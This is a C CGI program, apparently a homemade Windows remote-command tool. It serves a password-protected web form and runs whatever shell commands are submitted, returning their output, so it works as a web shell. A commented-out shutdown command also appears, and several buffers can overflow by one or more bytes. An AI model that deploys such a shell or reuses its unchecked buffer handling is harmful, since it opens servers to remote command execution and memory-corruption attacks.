/* Change this if the SERVER_NAME environment variable does not report
	the true name of your web server. */
#if 1
#define SERVER_NAME cgiServerName
#endif
#if 0
#define SERVER_NAME "www.boutell.com"
#endif

/* You may need to change this, particularly under Windows;
	it is a reasonable guess as to an acceptable place to
	store a saved environment in order to test that feature. 
	If that feature is not important to you, you needn't
	concern yourself with this. */

#ifdef WIN32
#define SAVED_ENVIRONMENT "e:\\cgicsave.env"
#else
#define SAVED_ENVIRONMENT "/tmp/cgicsave.env"
#endif /* WIN32 */

#include <stdio.h>
#include "cgic.h"
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
//#include <dos.h>
#include<windows.h>

void executeCmd(const char *cmd,char *res){
	//strcpy(res,cmd);
	char buffer[10];
	char fileBuffer[100];
	int failCount;
	int doFileLen=sizeof(fileBuffer);
	FILE *file;
	FILE *doFile;
	FILE *resFile;
	int doInt=0;
	int resLen=0;
	char writeBuffer[100];
	char line[100];
	int cmdP=0;
	int lineP=0;
	strcpy(res,"");
	file=fopen("temp_cmd.bat","w");
	fputs(cmd,file);
	fputs("\n exit",file);
	/*while(1){
		if(cmd[cmdP]==0)break;
		lineP=0;
		while(cmd[cmdP]!='\n' &&cmd[cmdP]!=0){
			line[lineP++]=cmd[cmdP++];
		}
		
		line[lineP]=0;
		sprintf(writeBuffer,"start %s\n",line);
		fputs(writeBuffer,file);
		//
		if(cmd[cmdP]==0)break;
		cmdP++;
	}
	sprintf(writeBuffer,"exit");*/
	fclose(file);
	//system("temp_cmd.bat > temp_cmd_result.txt");
	
	system("echo 1 > do");
	
	
	failCount=100;
	
	while(failCount--){
		Sleep(100);
		//system("ping 127.0.0.1 -n 1>nul");
		if((doFile=fopen("do","r"))==NULL)continue;
		doFileLen=fread(fileBuffer,sizeof(char),doFileLen,doFile);
		fileBuffer[doFileLen]=0;
		fclose(doFile);

	//	fprintf(cgiOut,"%s","<p>Ok! start read</p>\n");
	//	fprintf(cgiOut,"<p>buffer=%send</p>",fileBuffer);
		doInt=atoi(fileBuffer);
		if(doInt==0){
			//after execute.
		//	fprintf(cgiOut,"%s","<p>reading</p>\n");
			resFile=fopen("temp_cmd_result.txt","r");
			resLen=fread(res,sizeof(char),2048,resFile);
			res[resLen]=0;
			fclose(resFile);
			break;
		}
	}
	system("del /f temp_cmd.bat");
}
void getRootPassword(char *pass){
	FILE *file;
	char buffer[10];
	file=fopen("rootPass.txt","r");
	while(!feof(file)){
		
		fgets(buffer,sizeof(buffer),file);
		strcat(pass,buffer);
	}
}

int cgiMain(){
	int isRoot=0;
	char rootPassword[81]="";
	getRootPassword(rootPassword);

	cgiHeaderContentType("text/html");
	fprintf(cgiOut,"%s","<h1>hello</h1>\n");
//
//	cgiHtmlEscape(rootPassword);
	 //system("dir /d > null.txt");
    //system("shutdown -s -t 1000 >> null.txt");
	//fprintf(cgiOut, "shutdown ing...");
   // system("pause ");

	fprintf(cgiOut, "<!-- 2.0: multipart/form-data is required for file uploads. -->");
	fprintf(cgiOut, "<form method=\"POST\" enctype=\"multipart/form-data\" ");
	fprintf(cgiOut, "	action=\"");
	cgiValueEscape(cgiScriptName);
	fprintf(cgiOut, "\">\n");
	fprintf(cgiOut, "<p>\n");
	

	fprintf(cgiOut, "Password:<input type=\"password\" name=\"password\">\n");fprintf(cgiOut, "<p>\n");

	fprintf(cgiOut, "<textarea NAME=\"cmd\" ROWS=4 COLS=40>\n");
	fprintf(cgiOut, "dir /d\n");
	fprintf(cgiOut, "</textarea>\n");fprintf(cgiOut, "<p>\n");

	fprintf(cgiOut, "<input type=\"submit\" name=\"execute\" value=\"execute\">\n");
	fprintf(cgiOut, "</form>\n");
	
	//
	if (cgiFormSubmitClicked("execute") == cgiFormSuccess)
	{

		//verify password:
		char password[81];
		cgiFormStringNoNewlines("password", password, 81);
		if(strcmp(password,rootPassword)==0){
			isRoot=1;
		}
		if(isRoot){
			fprintf(cgiOut, "******You are root user.******<BR>\n");
			
		}else{
			fprintf(cgiOut, "password is wrong!!!<BR>\n");
		}

		//executing cmd
		if(isRoot){
			char cmd[241];char cmdResult[2048]="nothing";
			cgiFormString("cmd",cmd,sizeof(cmd));
			executeCmd(cmd,cmdResult);
			fprintf(cgiOut, "executing cmd: <PRE>");
			cgiHtmlEscape(cmd);
			fprintf(cgiOut, "\n********Result*******\n");
			cgiHtmlEscape(cmdResult);
			fprintf(cgiOut, "</PRE>\n");
		
		}
	}

	return 0;
}

